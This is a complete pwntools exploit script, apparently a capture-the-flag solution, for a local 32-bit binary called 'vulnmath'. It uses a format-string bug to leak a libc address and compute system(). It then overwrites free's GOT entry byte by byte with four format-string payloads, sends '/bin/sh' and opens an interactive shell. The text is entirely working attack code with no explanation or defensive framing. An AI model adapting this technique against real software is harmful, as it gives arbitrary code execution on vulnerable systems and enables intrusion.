from pwn import *
#context.log_level='debug'

p = process('vulnmath')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('vulnmath')

p.recvuntil('> ')
p.sendline('%23$p')
p.recvuntil('Incorrect!\n')
base = int(p.recvline(),16)-247-libc.symbols['__libc_start_main']

sys = base + libc.symbols['system']


pay = fmtstr_payload(6,{elf.got['free']:sys&0xff},write_size='int')
p.recvuntil('> ')
p.sendline(pay)

pay = fmtstr_payload(6,{elf.got['free']+1:sys>>8&0xff},write_size='int')
p.recvuntil('> ')
p.sendline(pay)

pay = fmtstr_payload(6,{elf.got['free']+2:sys>>16&0xff},write_size='int')
p.recvuntil('> ')
p.sendline(pay)

pay = fmtstr_payload(6,{elf.got['free']+3:sys>>24&0xff},write_size='int')
p.recvuntil('> ')
p.sendline(pay)

# gdb.attach(p)
p.recvuntil('> ')
p.sendline('/bin/sh\x00')
#gdb.attach(p)
p.interactive()